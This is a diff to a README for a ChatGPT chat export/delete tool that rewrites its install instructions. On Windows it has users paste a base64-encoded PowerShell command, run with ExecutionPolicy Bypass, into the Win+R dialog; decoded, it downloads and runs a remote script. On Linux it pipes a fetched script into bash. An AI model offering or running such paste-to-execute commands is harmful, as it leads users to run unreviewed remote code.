@@ -229,11 +229,17 @@ MIT.
 
 The export/delete toolkit is kept in a **private** repository, separate from this publicly available ChatGPT-Export service. Installation starts with one paste; the user still requires repository access and their own GitHub + ChatGPT login. This does not grant anonymous access to private source code.
 
-**Windows:** Win+R → Ctrl+V → Enter:
+**Windows — exactly three steps:**
 
-```powershell
-powershell -NoExit -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/ZTD38F/ChatGPT-Export/main/install-chatgpt-direct.ps1 | iex"
+1. Press **Win + R**.
+2. Press **Ctrl + V** to paste this entire command into the Run dialog.
+3. Press **Enter**.
+
+```text
+powershell.exe -NoExit -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwB0AG8AcAAnADsAJABwAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAGUAbgB2ADoAVABFAE0AUAAgACcAQwBoAGEAdABHAFAAVABEAGkAcgBlAGMAdAAtAGkAbgBzAHQAYQBsAGwALgBwAHMAMQAnADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AWgBUAEQAMwA4AEYALwBDAGgAYQB0AEcAUABUAC0ARQB4AHAAbwByAHQALwBtAGEAaQBuAC8AaQBuAHMAdABhAGwAbAAtAGMAaABhAHQAZwBwAHQALQBkAGkAcgBlAGMAdAAuAHAAcwAxACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAOwAmACAAJABwAA==
 ```
+
+The Windows launcher saves the public HTTPS bootstrap as a local `.ps1` file and runs that file. It does **not** use `irm | iex` or dynamically evaluate fetched source text. `-EncodedCommand` is UTF-16LE command-line quoting, not a trust or integrity guarantee; inspect the linked bootstrap before trusting it. Windows policy restrictions still apply.
 
 **Linux:** one paste into Terminal:
 
@@ -241,4 +247,4 @@ powershell -NoExit -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.
 curl -fsSL https://raw.githubusercontent.com/ZTD38F/ChatGPT-Export/main/install-chatgpt-direct.sh | bash
 ```
 
-Both commands download and execute a bootstrap from this public repository. Inspect the bootstrap source first if you do not trust it. The installer does not delete any chats; deletion requires explicit review and confirmation.
+Both Windows and Linux installers fetch and execute the bootstrap from this public repository; review the source before execution. The installer does not delete any chats; deletion requires explicit review and confirmation.
